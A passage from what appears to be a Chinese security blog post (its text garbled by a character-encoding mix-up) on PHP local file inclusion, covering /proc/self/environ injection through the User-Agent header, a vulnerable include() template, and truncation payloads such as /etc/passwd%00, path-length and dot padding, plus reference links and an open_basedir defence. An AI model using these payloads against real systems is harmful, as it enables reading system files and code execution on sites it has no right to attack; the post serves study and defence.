<p>proc/self/environä¸­ä¼šä¿å­˜user-agentå¤´ã€‚å¦‚æœåœ¨user-agentä¸­æ’å…¥phpä»£ç ï¼Œåˆ™phpä»£ç ä¼šè¢«å†™å…¥åˆ°environä¸­ã€‚ä¹‹åå†åŒ…å«å®ƒï¼Œå³å¯ã€‚</p>
<p>å¯ä»¥å‚è€ƒè¿™ä¸ªï¼š</p>
<p><a target="_blank" rel="noopener" href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html">The proc/self/environ Injection</a></p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/papers/12886/">shell via LFI - proc/self/environ method</a></p>
<h1 id="æœ¬åœ°åŒ…å«å°å§¿åŠ¿"><a href="#æœ¬åœ°åŒ…å«å°å§¿åŠ¿" class="headerlink" title="æœ¬åœ°åŒ…å«å°å§¿åŠ¿"></a>æœ¬åœ°åŒ…å«å°å§¿åŠ¿</h1><p>å®¡è®¡ä¸­å¯è§è¿™æ ·çš„åŒ…å«æ¨¡ç‰ˆæ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&quot;inc/&quot; . $_GET[&#x27;file&#x27;] . &quot;.htm&quot;); ?&gt; </span><br></pre></td></tr></table></figure>
<ul>
<li>%00æˆªæ–­<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd%00</span><br></pre></td></tr></table></figure>
(éœ€è¦ magic_quotes_gpc=offï¼ŒPHPå°äº5.3.4æœ‰æ•ˆ)</li>
</ul>
<ul>
<li><p>%00æˆªæ–­ç›®å½•éå†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/%00</span><br></pre></td></tr></table></figure>
<p>(éœ€è¦ magic_quotes_gpc=offï¼Œunixæ–‡ä»¶ç³»ç»Ÿï¼Œæ¯”å¦‚FreeBSDï¼ŒOpenBSDï¼ŒNetBSDï¼ŒSolaris)</p>
</li>
<li><p>è·¯å¾„é•¿åº¦æˆªæ–­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd/././././././.[â€¦]/./././././.</span><br></pre></td></tr></table></figure>
<p>(phpç‰ˆæœ¬å°äº5.2.8(?)å¯ä»¥æˆåŠŸï¼Œlinuxéœ€è¦æ–‡ä»¶åé•¿äº4096ï¼Œwindowséœ€è¦é•¿äº256)</p>
</li>
<li><p>ç‚¹å·æˆªæ–­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/boot.ini/â€¦â€¦â€¦[â€¦]â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>
<p>(phpç‰ˆæœ¬å°äº5.2.8(?)å¯ä»¥æˆåŠŸï¼Œåªé€‚ç”¨windowsï¼Œç‚¹å·éœ€è¦é•¿äº256)</p>
</li>
</ul>
<h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a target="_blank" rel="noopener" href="https://dustri.org/b/from-lfi-to-rce-in-php.html">From LFI to RCE in php</a><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/iamstudy/articles/include_file.html">l3m0n: æ–‡ä»¶åŒ…å«æ¼æ´å°ç»“</a><br><a target="_blank" rel="noopener" href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI Cheat Sheet</a><br><a target="_blank" rel="noopener" href="https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion">Local File Inclusion</a></p>
<p><a target="_blank" rel="noopener" href="http://wiki.wooyun.org/web:lfi">http://wiki.wooyun.org/web:lfi</a></p>
<p>PHPæ–‡ä»¶åŒ…å«æ¼æ´æ€»ç»“ï¼š<br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/3827">http://drops.wooyun.org/tips/3827</a></p>
<p>æ–‡ä»¶åŒ…å«ä¸æ³¨å…¥åˆ©ç”¨æ€»ç»“ï¼š<br><a target="_blank" rel="noopener" href="https://www.91ri.org/2736.html">https://www.91ri.org/2736.html</a></p>
<p>php://inputï¼Œphp://filterï¼Œdata URI schemaçš„é‚£äº›äº‹ï¼š<br><a target="_blank" rel="noopener" href="https://www.91ri.org/7470.html">https://www.91ri.org/7470.html</a></p>
<p>pharåè®®ï¼š<br><a target="_blank" rel="noopener" href="https://www.91ri.org/13363.html">https://www.91ri.org/13363.html</a></p>
<p>è®ºPHPå¸¸è§çš„æ¼æ´ï¼š<br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/4544">http://drops.wooyun.org/papers/4544</a></p>
<p>LFI WITH PHPINFO() ASSISTANCEï¼š<br><a target="_blank" rel="noopener" href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></p>
<p>PHP_LFI_rfc1867_temporary_filesï¼š<br><a target="_blank" rel="noopener" href="http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf">http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf</a></p>
<p>zipæˆ–pharåè®®åŒ…å«æ–‡ä»¶<br><a target="_blank" rel="noopener" href="http://bl4ck.in/index.php/tricks/use-zip-or-phar-to-include-file.html">http://bl4ck.in/index.php/tricks/use-zip-or-phar-to-include-file.html</a></p>
<h1 id="å·¥å…·-amp-amp-é˜²å¾¡"><a href="#å·¥å…·-amp-amp-é˜²å¾¡" class="headerlink" title="å·¥å…·&amp;&amp;é˜²å¾¡"></a>å·¥å…·&amp;&amp;é˜²å¾¡</h1><p>å·¥å…·ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://github.com/P0cL4bs/Kadimus/">https://github.com/P0cL4bs/Kadimus/</a></p>
<p>é˜²å¾¡ï¼š</p>
<ul>
<li>è®¾ç½®open_basedir</li>
</ul>
</div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/phpæ–‡ä»¶åŒ…å«/">phpæ–‡ä»¶åŒ…å«</a></li></ul></footer></article><section class="reward"> <a class="btn-reward" href="#">Contact me</a><div class="reward-wrapper clearfix"><img src="/img/wechat.png" title="å¾®ä¿¡"></div></section></main><footer class="foot"><div class="foot-copy">&copy; 2016-2021 vQAQv</div></footer>
<script src="/js/scroller.js"></script>

<script src="/js/main.js"></script>
</body></html>